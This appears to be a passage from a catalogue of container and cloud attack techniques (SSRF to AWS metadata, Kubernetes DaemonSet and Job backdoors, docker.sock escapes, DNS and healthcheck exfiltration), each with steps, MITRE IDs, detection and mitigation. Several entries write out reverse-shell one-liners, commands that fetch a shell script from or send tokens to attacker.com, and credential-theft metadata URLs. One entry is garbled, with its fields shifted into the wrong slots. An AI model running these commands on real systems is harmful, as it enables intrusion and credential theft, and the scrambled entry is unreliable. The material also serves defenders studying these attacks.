- **Tags**: Enforce resource quotas and limits in manifests

## Accessing AWS Credentials from EC2 Metadata via SSRF

- **Attack Type**: Cloud Metadata API Abuse via SSRF
- **Target**: Cloud Metadata API
- **Vulnerability**: SSRF + open metadata access
- **MITRE**: T1213.003
- **Impact**: Credential theft + cloud pivot
- **Tools**: Burp Suite, curl
- **Scenario**: SSRF bug inside the app is used to access 169.254.169.254 and extract AWS IAM credentials.
- **Attack Steps**: 1. Attacker discovers SSRF vulnerability in containerized app (/image?url=http://...).2. Sends request like curl /image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/.3. Extracts role name, then dumps credentials from metadata API.4. Uses temporary keys to run aws s3 ls, ec2 describe-instances, etc.5. May also assume roles using sts:AssumeRole for lateral movement.6. Abuses tokens to modify cloud resources or exfiltrate data.7. As traffic is internal, it's hard to detect unless specific SSRF defense is in place.8. Potential full cloud compromise depending on IAM policy attached.
- **Detection**: VPC Flow Logs, CloudTrail, App Logs
- **Solution**: SSRF mitigation, metadata v2 usage, IAM scoping
- **Tags**: #ssrf #awsmetadata #credentialtheft

## Kubernetes DaemonSet Abuse for Cluster-Wide Access

- **Attack Type**: DaemonSet Backdoor Deployment
- **Target**: All K8s Nodes
- **Vulnerability**: Overprivileged RBAC + open DS creation
- **MITRE**: T1055
- **Impact**: Persistent node access across entire cluster
- **Tools**: kubectl, bash, netcat
- **Scenario**: Attacker deploys a malicious DaemonSet to get persistent shell across all cluster nodes.
- **Attack Steps**: 1. Attacker has permissions to create K8s DaemonSet (either through misconfigured RBAC or compromised CI pipeline).2. Crafts YAML file to deploy a pod on every node with reverse shell logic (bash -i >& /dev/tcp/IP/PORT 0>&1).3. Applies with kubectl apply -f malicious-daemonset.yaml.4. Each pod opens reverse shell back to attacker's server.5. Attacker receives multiple shells from all cluster nodes.6. Uses this access to extract secrets, manipulate host files, and remain persistent.7. Blue team may miss it as it's “legitimate” workload in DaemonSet format.8. High-impact cluster-wide takeover scenario.
- **Detection**: DaemonSet watch, outgoing traffic alerts
- **Solution**: Limit DS creation to cluster admins, monitor network anomalies
- **Tags**: #daemonset #persistence #k8sbackdoor

## Inter-Container Poisoning via Shared Volumes

- **Attack Type**: Volume Injection for Backdoor
- **Target**: bash`.3. Container B is configured to auto-run scripts from that folder on startup or cron.4. When container B executes the malicious script, reverse shell is triggered.5. Attacker gains control over container B’s environment.6. Could further spread by writing more scripts or replacing binaries in shared volume.7. Effective when volumes are auto-mounted and trust assumptions are wrong.8. May bypass traditional EDR as injection happens through file system.
- **Vulnerability**: Shared Volume
- **MITRE**: No input sanitization or script validation
- **Impact**: T1059.004
- **Tools**: bash, echo, cron
- **Scenario**: Attacker drops payload into a shared volume used by another container to trigger execution.
- **Attack Steps**: 1. Container A and B share volume /data mounted to both containers.2. Attacker in container A writes to /data/script.sh with payload: `#!/bin/bash\ncurl attacker.com/shell.sh
- **Detection**: Cross-container persistence or code exec
- **Solution**: File system watch tools, cron logs
- **Tags**: Scan volumes, block shared untrusted code execution

## Abuse of Service Mesh Telemetry for Recon

- **Attack Type**: Passive Recon via Observability
- **Target**: Observability Services
- **Vulnerability**: No auth on telemetry UI
- **MITRE**: T1592
- **Impact**: Reconnaissance & targeting precision
- **Tools**: PromQL, Grafana UI, curl
- **Scenario**: Attacker leverages Prometheus, Grafana, or tracing tools exposed internally for recon.
- **Attack Steps**: 1. Attacker finds Prometheus running at http://prometheus.monitoring:9090 without auth.2. Accesses time-series metrics: up, http_requests_total, process_cpu_seconds_total.3. Identifies active services, internal IPs, container names, uptime.4. Uses metrics to guess which services are vulnerable (e.g., admin APIs, large traffic endpoints).5. Accesses Grafana or Jaeger UI to trace HTTP paths and error logs.6. Uses this intelligence for targeted attacks like SSRF, parameter injection, etc.7. All done passively without alerting if no auth or monitoring.8. Observability systems become an attacker’s intelligence goldmine.
- **Detection**: Prometheus logs, port scan detection
- **Solution**: Secure observability endpoints with auth & RBAC
- **Tags**: #prometheus #grafana #observabilityabuse

## Container Breakout via Kernel Exploit (Dirty COW)

- **Attack Type**: Privilege Escalation with Dirty COW
- **Target**: Linux Host via Container
- **Vulnerability**: Unpatched kernel + write-capable container
- **MITRE**: T1068
- **Impact**: Full host takeover from container exploit
- **Tools**: exploit.c, gcc, bash
- **Scenario**: Exploits Linux kernel vulnerability (CVE-2016-5195) from container to escalate privileges.
- **Attack Steps**: 1. Attacker finds host kernel vulnerable to Dirty COW (< 4.8.3).2. Transfers Dirty COW exploit (exploit.c) into container.3. Compiles with gcc -pthread exploit.c -o cowroot.4. Executes binary to overwrite root-owned files (e.g., /etc/passwd).5. Replaces root password or injects new root user.6. On restart or file reload, attacker has root shell on host.7. Requires container with write permission and old kernel.8. Extremely stealthy if container logging is weak.9. Not blocked unless runtime policies or kernel patching is enforced.
- **Detection**: Syscalls & kernel alerts, Falco, AppArmor
- **Solution**: Patch kernels, enforce seccomp, disable unsafe syscalls
- **Tags**: #dirtycow #kernelescape #containerbreakout

## Lateral Movement via Redis Without Auth

- **Attack Type**: Exploiting Open Redis Services
- **Target**: Redis Container
- **Vulnerability**: No authentication & writable config
- **MITRE**: T1021.002
- **Impact**: Gaining execution foothold via open services
- **Tools**: redis-cli, netcat, bash
- **Scenario**: Exploiting an internal Redis container without authentication to pivot across container boundaries.
- **Attack Steps**: 1. Attacker compromises a container and scans internal network for open Redis ports (6379).2. Connects using redis-cli or nc to the target container’s Redis instance.3. Finds that no password is required and gains access to Redis shell.4. Executes config get dir and config get dbfilename to learn where Redis stores files.5. Uses set and save to write SSH public key or reverse shell payload into crontab or bash scripts.6. If Redis is running as root, the attacker gains persistent access.7. Alternatively, uses Redis to dump environment variables and pivot further.8. Redis becomes a stepping stone into privileged containers or the host if running with excessive permissions.
- **Detection**: Container port scanning, Redis logs
- **Solution**: Require Redis auth, restrict to localhost, run as non-root
- **Tags**: #redisabuse #internalpivot #openservices

## SSRF via Misconfigured Nginx Reverse Proxy

- **Attack Type**: SSRF to Metadata or Admin APIs
- **Target**: Web Proxy Container
- **Vulnerability**: Nginx SSRF misrouting & internal access
- **MITRE**: T1213.003
- **Impact**: Secret access via SSRF
- **Tools**: curl, burp, Nginx config
- **Scenario**: Exploiting a misconfigured Nginx reverse proxy to reach internal services like cloud metadata API or DBs.
- **Attack Steps**: 1. Attacker finds web app container uses Nginx with proxy rules like proxy_pass $uri.2. Sends crafted requests like http://victim.com/http://169.254.169.254/latest/meta-data/.3. Due to improper URL parsing, Nginx forwards request to cloud metadata API.4. Metadata API responds with IAM credentials or EC2 instance info.5. Attacker uses extracted IAM creds to call cloud APIs (S3, EC2).6. If internal DBs or admin panels are hosted at 127.0.0.1:9000, attacker may also reach those via SSRF.7. Internal-only APIs become exposed due to SSRF path traversal via Nginx misrouting.8. All this happens without direct access to backend container.
- **Detection**: Web access logs, cloud API requests
- **Solution**: Validate backend URLs, reject nested URIs, use metadata v2
- **Tags**: #ssrf #nginxproxy #cloudmetadata

## Abusing Kubelet Read-Only Port for Recon

- **Attack Type**: Reconnaissance via Kubelet
- **Target**: K8s Node
- **Vulnerability**: Exposed Kubelet read-only API
- **MITRE**: T1592
- **Impact**: Recon leading to lateral movement
- **Tools**: curl, nmap, bash
- **Scenario**: Attacker discovers open Kubelet read-only port (10255) and uses it to map running pods and services.
- **Attack Steps**: 1. Attacker scans internal IPs and finds port 10255 exposed on Kubelet node.2. Accesses endpoint like http://<node-ip>:10255/pods without authentication.3. Retrieves full pod specs: images, environment variables, volume mounts, and IPs.4. Extracts service account names, container names, and exposed ports.5. Uses /stats/summary to profile pod behavior and traffic volume.6. Builds a map of inter-pod communication and pod privileges.7. Prepares follow-up lateral movement paths (e.g., exec into higher-privileged pods).8. Could lead to cluster pivoting depending on exposure.
- **Detection**: Kubelet logs, unusual port requests
- **Solution**: Disable 10255 or restrict via firewall and RBAC
- **Tags**: #kubelet #k8srecon #podmapping

## Horizontal Privilege Escalation via Token Reuse

- **Attack Type**: Stolen Token Replay
- **Target**: Peer Containers
- **Vulnerability**: Shared trust model without audience check
- **MITRE**: T1550.003
- **Impact**: Unauthorized cross-container access
- **Tools**: curl, bash
- **Scenario**: Using a stolen token from a lower-privileged container to access peer services with same trust boundary.
- **Attack Steps**: 1. Attacker dumps environment variables from compromised container and finds a Bearer token or JWT.2. Tries the same token to call APIs on neighboring services (e.g., via internal DNS or IPs).3. Services don't validate token origin (i.e., shared JWT secret), so access is granted.4. Attacker queries /admin endpoints, modifies records, or exfiltrates data.5. Since token was originally issued to another container, it's accepted silently.6. No validation of audience or origin leads to horizontal escalation.7. Replay continues until token expires or logs are reviewed.8. Privilege escalation across containers is achieved via token misuse.
- **Detection**: API request logs, JWT issuer mismatch
- **Solution**: Validate token origin, rotate secrets, enforce token scoping
- **Tags**: #tokenreuse #horizontalescalation #jwtmisuse

## Exploiting Weak Internal DNS Naming for SSRF

- **Attack Type**: DNS-based Pivoting
- **Target**: K8s Internal Services
- **Vulnerability**: No DNS segmentation or service isolation
- **MITRE**: T1071.004
- **Impact**: Internal targeting & SSRF chaining
- **Tools**: dig, curl, nslookup
- **Scenario**: Using predictable internal service names to reach sensitive endpoints or metadata APIs.
- **Attack Steps**: 1. Attacker in container tests internal DNS resolution via dig svc-name.namespace.svc.cluster.local.2. Finds services like db-service, admin-panel, internal-api resolving to internal IPs.3. Sends requests to test for unauthenticated access or SSRF opportunities.4. In some cases, services don’t authenticate internal calls, assuming they're from trusted peers.5. Uses SSRF-capable endpoints in one service to reach deeper services.6. Eventually reaches cloud metadata endpoint via internal path (e.g., via logging or tracing tools).7. DNS naming predictability allows for service enumeration.8. Threat expands as attacker chains DNS → SSRF → cloud.
- **Detection**: DNS request logs, metadata access alerts
- **Solution**: Use RBAC for services, enable DNS segmentation
- **Tags**: #k8sdns #internalpivot #svcdiscovery

## Data Exfiltration via Outbound DNS in Container

- **Attack Type**: DNS Tunneling for Exfiltration
- **Target**: Container Network
- **Vulnerability**: No egress restriction or DNS monitoring
- **MITRE**: T1048.003
- **Impact**: Silent exfiltration of secrets
- **Tools**: dnschef, dig, base64
- **Scenario**: Attacker encodes secrets in DNS queries to bypass outbound traffic restrictions.
- **Attack Steps**: 1. Attacker installs dig inside container and sets custom nameserver (e.g., attacker.com).2. Encodes secret data using base64 (e.g., API keys, tokens).3. Sends queries like base64secret.attacker.com, which resolve via DNS.4. Attacker-controlled nameserver logs query and decodes the secret.5. DNS is often allowed outbound even in strict firewalls.6. This bypasses proxy/DLP and avoids HTTP inspection.7. Could also be used for C2 signaling.8. Highly stealthy unless DNS exfil is explicitly monitored.
- **Detection**: DNS server logs, entropy detection
- **Solution**: Enforce egress filtering, DNS over TLS, monitor high-entropy domains
- **Tags**: #dnsexfil #covertchannel #containerdns

## Pivot to Host via Procfs Enumeration

- **Attack Type**: /proc Leak Exploitation
- **Target**: Linux Host from Container
- **Vulnerability**: Weak container isolation, host PID namespace
- **MITRE**: T1083
- **Impact**: Recon & host process manipulation
- **Tools**: bash, cat, lsof
- **Scenario**: Reading /proc to gain info about host processes and container isolation boundaries.
- **Attack Steps**: 1. Attacker inspects /proc inside container to find host-visible processes.2. Runs cat /proc/1/cgroup to identify container boundaries.3. Checks /proc/net/tcp and /proc/net/udp to find listening services.4. Uses /proc/<pid>/fd/ to find open file descriptors and sensitive mounts.5. Discovers bind mounts to host directories (/etc, /root).6. If container is running with --pid=host, attacker can access all host processes.7. Dumps memory from host processes or reuses sockets.8. Valuable for follow-up rootkits or persistence.
- **Detection**: Sysmon/container audit tools
- **Solution**: Disable host PID sharing, limit /proc visibility via AppArmor
- **Tags**: #procfs #containerns #linuxleaks

## Extracting Secrets from Misconfigured Vault Sidecar

- **Attack Type**: Vault Integration Misuse
- **Target**: Vault Sidecar
- **Vulnerability**: No token scoping or lease restrictions
- **MITRE**: T1552.001
- **Impact**: Unauthorized secret access & manipulation
- **Tools**: Vault CLI, curl, jq
- **Scenario**: Misusing HashiCorp Vault sidecar token to read secrets from backend without proper ACL.
- **Attack Steps**: 1. App is integrated with Vault and uses a sidecar container to inject secrets.2. Attacker gets shell inside pod and finds VAULT_TOKEN env variable.3. Uses vault kv get secret/app or curl -H "X-Vault-Token:..." to read secrets.4. Token is overly permissive and not tied to service identity.5. Reads secrets of other apps or environment (e.g., DB credentials, signing keys).6. Also extracts token TTL and renews it to persist access.7. Could upload malicious secrets to trick other apps.8. No IP-bound or identity-based constraints present.
- **Detection**: Vault audit logs, secret access alerts
- **Solution**: Use Vault policies, short TTL, identity-based access
- **Tags**: #vaultabuse #secretmisuse #tokenleak

## Lateral Move via Service Account Impersonation

- **Attack Type**: Kubernetes SA Impersonation via Token
- **Target**: Kubernetes API
- **Vulnerability**: No TTL/rotation for SA tokens
- **MITRE**: T1078.004
- **Impact**: Identity spoofing & lateral pivot
- **Tools**: kubectl, curl
- **Scenario**: Stealing and replaying service account token to impersonate another workload.
- **Attack Steps**: 1. Attacker dumps service account token inside container A.2. Reuses token to call Kubernetes API via curl.3. Attempts API calls like list pods, create deployments, or exec.4. K8s API accepts token and treats attacker as container A’s identity.5. If container A is bound to powerful ClusterRole, attacker gains widespread access.6. Token is long-lived if TTL isn't enforced.7. Uses impersonated privileges to modify other workloads or access secrets.8. Full lateral compromise of multiple pods/workloads possible.
- **Detection**: K8s audit logs, unusual pod actions
- **Solution**: Rotate tokens, limit scope, enforce OIDC identity provider
- **Tags**: #saimpersonation #k8stoken #identityabuse

## Reverse Shell via Job Resource Abuse in K8s

- **Attack Type**: K8s Job Injection
- **Target**: Kubernetes Cluster
- **Vulnerability**: RBAC allows job creation
- **MITRE**: T1059.004
- **Impact**: Remote shell + execution in cluster
- **Tools**: kubectl, bash, socat
- **Scenario**: Attacker creates a Kubernetes Job with malicious reverse shell payload.
- **Attack Steps**: 1. Attacker has RBAC permission to create batch/v1 Jobs.2. Writes Job YAML that runs bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'.3. Applies it using kubectl apply -f backdoor-job.yaml.4. Job starts pod with malicious container that connects back to attacker.5. Attacker receives reverse shell from K8s node.6. Can pivot further or download additional payloads.7. Blue team may overlook it if job name appears benign (e.g., backup-sync).8. High-risk technique if RBAC allows job creation but not other higher-risk resources.
- **Detection**: Job activity logs, outbound traffic alerts
- **Solution**: Restrict Job creation to trusted users, alert on suspicious job names
- **Tags**: #k8sjob #reverseshell #backdoorinjection

## Abusing Default Service Account in K8s for Secret Access

- **Attack Type**: Privilege Escalation via Default SA
- **Target**: Kubernetes Pods
- **Vulnerability**: Default SA with excessive access
- **MITRE**: T1552.007
- **Impact**: Unauthorized access to secrets and configs
- **Tools**: kubectl, bash, curl
- **Scenario**: Exploiting containers running with default service account that has excessive access to Kubernetes secrets.
- **Attack Steps**: 1. Attacker gains access to a container.2. Inside, checks /var/run/secrets/kubernetes.io/serviceaccount/token to find SA token.3. Uses curl with token to query K8s API: GET /api/v1/namespaces/default/secrets.4. Discovers credentials, database secrets, or TLS keys stored as Secrets in the namespace.5. If RBAC allows, reads secrets across other namespaces too.6. Uses secrets to pivot to internal services (DBs, cloud, etc.).7. Blue team doesn’t detect because default SA is considered "safe".8. Attacker now controls lateral movement and possibly data exfil.
- **Detection**: K8s audit logs, unexpected secret access
- **Solution**: Limit default SA permissions, bind roles tightly
- **Tags**: #rbac #defaultserviceaccount #secretleak

## Pivoting via Docker Network Bridges

- **Attack Type**: Bridge Network Exploitation
- **Target**: Docker Host Network
- **Vulnerability**: Default bridge network, no egress rules
- **MITRE**: T1595.002
- **Impact**: Lateral movement and service exploitation
- **Tools**: nmap, bash, docker
- **Scenario**: Using Docker’s default bridge network to reach other containers without restrictions.
- **Attack Steps**: 1. Attacker gets shell in a compromised container running on Docker bridge network (docker0).2. Lists interfaces and discovers peer container IPs via ip a and ip route.3. Uses nmap or nc to scan nearby IPs (usually in 172.17.0.0/16).4. Discovers services like Redis, MySQL, internal APIs open without auth.5. Connects directly to those services from within container without NAT.6. Data exfiltration, command execution, or data manipulation occurs.7. Host firewall is ineffective inside container space.8. Lateral movement within a host is completed silently.
- **Detection**: Docker network logs, container-level alerts
- **Solution**: Isolate containers using custom networks, restrict inter-container traffic
- **Tags**: #dockernetwork #bridgescan #intrahostpivot

## Internal API Access via JWT Confusion

- **Attack Type**: JWT Algorithm Confusion
- **Target**: Internal APIs
- **Vulnerability**: JWT validation flaw (alg mismatch)
- **MITRE**: T1552.007
- **Impact**: Unauthorized internal API execution
- **Tools**: jwt.io, burp, openssl
- **Scenario**: Exploiting JWT signature algorithm misuse to access internal authenticated services.
- **Attack Steps**: 1. Attacker intercepts JWT token used for internal service access.2. Observes it’s signed using alg: HS256, but believes server uses RS256.3. Substitutes RS256 with HS256 and signs token using the public key as HMAC key.4. Internal API fails to verify algorithm switch, accepts attacker-forged token.5. Attacker sends requests to privileged API endpoints inside cluster.6. Sensitive functions (admin, delete, dump logs) get accessed.7. JWT confusion bypasses signature validation logic.8. Attack spreads laterally across microservices accepting same JWT validation logic.
- **Detection**: API gateway logs, signature anomalies
- **Solution**: Enforce strict JWT algorithm validation
- **Tags**: #jwtconfusion #authbypass #microservices

## Exploiting Unused but Listening Internal Services

- **Attack Type**: Inactive Port Exploitation
- **Target**: Internal Microservices
- **Vulnerability**: Open ports with no auth or monitoring
- **MITRE**: T1046
- **Impact**: Pivot through forgotten attack surfaces
- **Tools**: nmap, netcat, bash
- **Scenario**: Scanning for and interacting with dormant internal services still listening on containers or hosts.
- **Attack Steps**: 1. Attacker scans internal network using nmap from a container.2. Finds ports open (e.g., 8080, 7000) on other containers that don’t seem in use.3. Connects using nc or curl and receives unexpected responses indicating debug or internal services.4. Discovers forgotten admin panels or dev endpoints (e.g., /config, /env).5. May dump environment vars, config settings, or credentials.6. Uses these findings to escalate, e.g., log4j RCE or SSRF injection.7. These services often lack auth due to assumed "internal-only" exposure.8. Attackers exploit these to move deeper into infra or trigger persistence.
- **Detection**: Network flow logs, EDR, container scans
- **Solution**: Close unused ports, set internal auth everywhere
- **Tags**: #portscan #unusedservice #forgottenentrypoint

## Chained SSRF to S3 Bucket Enumeration

- **Attack Type**: SSRF to Cloud Storage Mapping
- **Target**: Cloud Storage / S3
- **Vulnerability**: SSRF to metadata + permissive IAM
- **MITRE**: T1190
- **Impact**: Unauthorized cloud data discovery
- **Tools**: curl, AWS CLI, burp
- **Scenario**: Exploiting SSRF to interact with AWS S3 APIs and list buckets tied to IAM instance roles.
- **Attack Steps**: 1. Attacker finds SSRF entry point in containerized web app (url= parameter).2. Sends payloads like http://169.254.169.254/latest/meta-data/iam/security-credentials/.3. Extracts access/secret keys and temporary session token.4. Switches to local AWS CLI with aws configure using stolen creds.5. Executes aws s3 ls or aws s3api list-buckets.6. Enumerates all accessible buckets.7. Uses SSRF again to trigger bucket listing from inside victim’s environment.8. Potential for full read/write access depending on IAM policy.
- **Detection**: CloudTrail (if enabled), S3 API logs
- **Solution**: Deny metadata IP in SSRF targets, scope IAM
- **Tags**: #ssrf #s3enumeration #cloudpivot

## Pivot via SSH Private Key Left in Container

- **Attack Type**: Hardcoded SSH Keys in Images
- **Target**: Developer Host / CI VM
- **Vulnerability**: Sensitive files embedded in container
- **MITRE**: T1552.004
- **Impact**: Host compromise and privilege escalation
- **Tools**: find, ssh, bash
- **Scenario**: Extracting developer’s private key accidentally baked into container and using it to pivot.
- **Attack Steps**: 1. Attacker gets shell in container image and runs find / -name '*id_rsa*' or checks /root/.ssh/.2. Finds private key (e.g., id_rsa) embedded from dev build context.3. Extracts it and uses ssh -i id_rsa user@targethost.4. If SSH access is allowed from container subnet, logs into dev/test machines.5. May pivot further into CI, monitoring, or internal dashboards.6. Often overlooked due to image being internal.7. Attack scales if multiple keys are reused.8. This leads to lateral movement beyond containers.
- **Detection**: Image scan logs, SSH access anomalies
- **Solution**: Enforce multi-stage builds, scan images with Trivy
- **Tags**: #sshleak #pivot #containermistake

## Docker Daemon Exposure Inside Kubernetes Pod

- **Attack Type**: Docker.sock Socket Abuse in Pod
- **Target**: Kubernetes Pod / Host
- **Vulnerability**: Mounted docker.sock from host
- **MITRE**: T1611
- **Impact**: Full host takeover via container escape
- **Tools**: docker CLI, bash, socat
- **Scenario**: Pod with access to host Docker socket leads to full container creation/control over host.
- **Attack Steps**: 1. A privileged pod mounts /var/run/docker.sock.2. Attacker gains shell inside pod and uses docker ps to list host containers.3. Runs docker run -v /:/host alpine chroot /host to escape container.4. Now operates with host privileges, able to read/write system files.5. May add SSH keys to /root/.ssh/authorized_keys, replace binaries, or extract secrets.6. Blue team unaware as Docker logs remain local.7. Kubernetes layer is bypassed entirely; Docker access provides full host control.8. Classic breakout scenario.
- **Detection**: Docker daemon logs, file integrity tools
- **Solution**: Never expose docker.sock to untrusted pods
- **Tags**: #dockersock #containeregress #breakout

## Pivot from Container to Cloud via Open Proxy

- **Attack Type**: Open Proxy to Metadata Theft
- **Target**: Container/Internal Proxy
- **Vulnerability**: Open proxy with no egress controls
- **MITRE**: T1041
- **Impact**: Cloud credential theft via SSRF proxy
- **Tools**: curl, nmap, burp
- **Scenario**: Using unauthenticated internal HTTP proxy to redirect requests to cloud metadata.
- **Attack Steps**: 1. Attacker scans container network and finds open HTTP proxy service.2. Proxy accepts requests from any source without authentication.3. Sends curl -x http://<proxy_ip>:port http://169.254.169.254/latest/meta-data/.4. Proxy forwards request and attacker gets metadata back.5. Extracts IAM credentials or EC2 details from response.6. Uses AWS CLI with creds to access S3, EC2, etc.7. All from within the container.8. Proxy becomes silent metadata leak vector.
- **Detection**: Egress proxy logs, IAM role activity
- **Solution**: Require proxy auth, block internal IPs
- **Tags**: #proxyabuse #cloudmetadata #openforwarders

## Compromising Logging Agents to Exfil Data

- **Attack Type**: Log Forwarder Abuse
- **Target**: Log Collector Sidecars
- **Vulnerability**: Config tampering in log agents
- **MITRE**: T1567.002
- **Impact**: Silent data exfiltration via logging layer
- **Tools**: bash, curl, Fluentd config
- **Scenario**: Tampering with Fluentd or Logstash agents running inside containers to leak sensitive logs.
- **Attack Steps**: 1. Attacker accesses container with Fluentd log forwarder sidecar.2. Locates config file (/fluentd/etc/fluent.conf).3. Edits config to include custom http or tcp output to attacker server.4. Restarts Fluentd or waits for it to re-read config.5. Logs (including credentials, tokens, stack traces) are forwarded silently to attacker.6. Attack remains persistent and may go unnoticed for long.7. Alternatively, replaces Logstash filter to redirect certain log types.8. Legit log pipeline becomes an exfiltration tunnel.
- **Detection**: Fluentd logs, output endpoint monitoring
- **Solution**: Immutable configs, alert on outbound log sinks
- **Tags**: #logabuse #fluentd #logexfil

## Intercepting Internal JWT via Sidecar Volume Mounts

- **Attack Type**: Volume Leaks of Secrets
- **Target**: Shared Sidecar Volume
- **Vulnerability**: Lack of isolation between container roles
- **MITRE**: T1552.001
- **Impact**: Internal API access via shared secrets
- **Tools**: bash, cat, jq
- **Scenario**: Exploiting shared volume mounts between app and sidecar to intercept JWTs or secrets.
- **Attack Steps**: 1. App and sidecar share volume /shared/creds to exchange auth tokens.2. Attacker in compromised app container reads shared JWT file from that mount.3. Parses token and replays it to internal APIs.4. If sidecar or downstream services trust the JWT without origin check, attacker gains full API access.5. Sidecars are often assumed secure, but mounting credentials breaks separation.6. Replay may continue until token expiry.7. Attack invisible if volume is marked as part of business logic.8. Post-compromise movement deepens silently.
- **Detection**: File access logs, API endpoint monitoring
- **Solution**: Do not share token files via mounts, use pipes
- **Tags**: #sidecarleak #volumeabuse #secretsharing

## Privilege Escalation via Writable HostPath Volume

- **Attack Type**: Host File Manipulation via HostPath
- **Target**: Kubernetes Host Node
- **Vulnerability**: Writable HostPath with sensitive file access
- **MITRE**: T1611
- **Impact**: Full host compromise through filesystem writes
- **Tools**: kubectl, bash, mount
- **Scenario**: Escalate from container to host by modifying sensitive host files through mounted writable HostPath volumes.
- **Attack Steps**: 1. A pod is misconfigured with a writable HostPath volume pointing to the host’s /etc directory.2. Attacker inside the container navigates to /mnt/etc/shadow (mounted version of /etc/shadow from the host).3. Adds or replaces root user hash with a known password hash.4. Or creates a new root-level user in /mnt/etc/passwd.5. If host is rebooted or accessed directly, attacker can login using the planted credentials.6. Host compromise is achieved despite container boundaries.7. No K8s-level alert may be generated because it's seen as volume interaction.8. Attack can also modify system configs like SSH or sudoers.
- **Detection**: File integrity monitoring, auditd
- **Solution**: Avoid HostPath mounts for sensitive directories
- **Tags**: #hostpath #escalation #k8svolumemount

## Container Breakout Using Kernel Exploit CVE-2022-0492

- **Attack Type**: Kernel Capabilities Abuse
- **Target**: Container Host OS
- **Vulnerability**: Kernel vulnerability with loose capabilities
- **MITRE**: T1068
- **Impact**: Container-to-host privilege escalation
- **Tools**: exploit code, gcc, bash
- **Scenario**: Use of unpatched Linux kernel vulnerability to escape from an unprivileged container into host.
- **Attack Steps**: 1. Attacker gains access to a container running with CAP_SYS_ADMIN or unfiltered capabilities.2. Determines kernel version is vulnerable to CVE-2022-0492.3. Uploads PoC exploit into the container and compiles it using gcc.4. Runs exploit which uses cgroup release_agent mechanism to execute code on the host.5. Bypasses namespace and seccomp protections.6. Code executes as root on host machine.7. Attacker may install backdoors, extract sensitive files, or modify host OS behavior.8. High-impact breakout typically unnoticed unless kernel exploits are watched actively.
- **Detection**: Host logs (if EDR/AV installed), runtime tracing
- **Solution**: Patch kernel regularly, drop unnecessary caps
- **Tags**: #kernelpwn #containerescape #linuxexploit

## Lateral Pivot via Envoy or Istio Sidecar Misconfig

- **Attack Type**: Sidecar Proxy Bypass
- **Target**: Service Mesh Proxy
- **Vulnerability**: Open admin ports, lack of RBAC in sidecar
- **MITRE**: T1210
- **Impact**: Cross-service spoofing and pivoting
- **Tools**: envoy-admin, curl, iptables
- **Scenario**: Misconfigured Envoy sidecars allow attackers to reroute internal service traffic across namespaces.
- **Attack Steps**: 1. Attacker compromises pod with Envoy sidecar.2. Accesses Envoy admin interface (default port 15000) if not disabled.3. Sends requests to dynamically reconfigure routes to internal services (e.g., pods in other namespaces).4. Uses curl to interact with APIs behind microservice gateways.5. May send modified headers to spoof internal auth mechanisms.6. Admin dashboard also leaks config dump, metrics, or secrets.7. If control plane not RBAC-protected, attacker may persist in mesh.8. Can be chained with SSRF or token replays.
- **Detection**: Envoy logs, service mesh telemetry
- **Solution**: Disable admin port, apply mTLS & RBAC
- **Tags**: #servicemesh #envoyabuse #istioattack

## Abuse of Container Health Checks for Data Leak

- **Attack Type**: Healthcheck Channel Abuse
- **Target**: Container Runtime
- **Vulnerability**: Misuse of allowed health probe commands
- **MITRE**: T1041
- **Impact**: Covert data exfiltration
- **Tools**: Dockerfile, bash, DNS tunneling tools
- **Scenario**: Using Docker or K8s health checks to encode and exfiltrate sensitive data stealthily.
- **Attack Steps**: 1. Attacker edits or controls Dockerfile that includes a custom HEALTHCHECK instruction.2. The healthcheck script is modified to ping external DNS or webhook endpoint with encoded sensitive info (e.g., curl attacker.com?data=<token>).3. These commands run repeatedly in container lifecycle (every 30s or so).4. Can be set up as stealthy data exfiltration channel.5. Blue team may miss it because healthchecks are expected to fail/succeed.6. In Kubernetes, similar abuse can occur via livenessProbe or readinessProbe.7. All requests appear outbound and legitimate unless payloads are inspected.8. Egress rules and anomaly detection required to identify misuse.
- **Detection**: DNS/tunnel traffic patterns, webhook logs
- **Solution**: Review healthcheck scripts, monitor egress patterns
- **Tags**: #healthcheckabuse #exfiltration #dockerprobes

## Metadata API Theft via SSRF in Internal Dev API

- **Attack Type**: SSRF into Cloud Provider API
- **Target**: Internal Dev API
- **Vulnerability**: SSRF + Cloud metadata unprotected
- **MITRE**: T1190
- **Impact**: Cloud account compromise
- **Tools**: burp, curl, aws-cli
- **Scenario**: Leverage SSRF on internal endpoints to steal cloud instance IAM credentials.
- **Attack Steps**: 1. Attacker finds SSRF in a dev-only internal endpoint (e.g., debug/trace?url=http://...).2. Exploits the SSRF by requesting http://169.254.169.254/latest/meta-data/ from within a container.3. Retrieves IAM role assigned to container/pod.4. Uses token to authenticate via AWS CLI or SDK and list cloud assets (e.g., S3, EC2).5. If role has write or assume-role privileges, attacker may escalate.6. Attack is stealthy unless metadata access is monitored.7. Can be chained with lateral movement to compromise neighboring pods or accounts.8. A classic cloud SSRF that breaks isolation assumptions.
- **Detection**: CloudTrail (if enabled), app access logs
- **Solution**: Block 169.254.x access in SSRF targets
- **Tags**: #cloudssrf #metadataapi #iamtokensteal

## Log Injection to Tamper with Security Analysis

- **Attack Type**: Log Tampering
- **Target**: App Logs / SIEM
- **Vulnerability**: Unescaped user input in log statements
- **MITRE**: T1565.001
- **Impact**: Obfuscates attacker activity in logs
- **Tools**: bash, echo, syslog, Fluentd
- **Scenario**: Injecting fake log lines into app logs to confuse SIEM parsing or bury attacker traces.
- **Attack Steps**: 1. Attacker compromises an app that logs user input without sanitization.2. Sends input like \n[INFO] User root logged out, causing log injection.3. Injects misleading entries, suppresses real alert patterns.4. In some cases, injects new log structure that breaks SIEM parsing logic.5. If logs are centralized (e.g., via Fluentd), the tampered logs spread across systems.6. Useful post-compromise technique to hide traces or simulate false activity.7. Blue team reviewing logs may assume everything is functioning normally.8. Easily overlooked unless log formats are strictly validated.
- **Detection**: SIEM parsing errors, log format anomalies
- **Solution**: Sanitize input before logging, enforce log schemas
- **Tags**: #logtamper #siemevasion #injectionlogs

## Accessing Peer Container via /proc File Leaks

- **Attack Type**: /proc-based Cross-Container Snooping
- **Target**: Shared Kernel File System
- **Vulnerability**: Shared /proc visibility across containers
- **MITRE**: T1083
- **Impact**: Information leak, possible key/token exposure
- **Tools**: cat, bash, /proc filesystem
- **Scenario**: Exploiting weak isolation in Docker or LXC by reading shared /proc or /sys files.
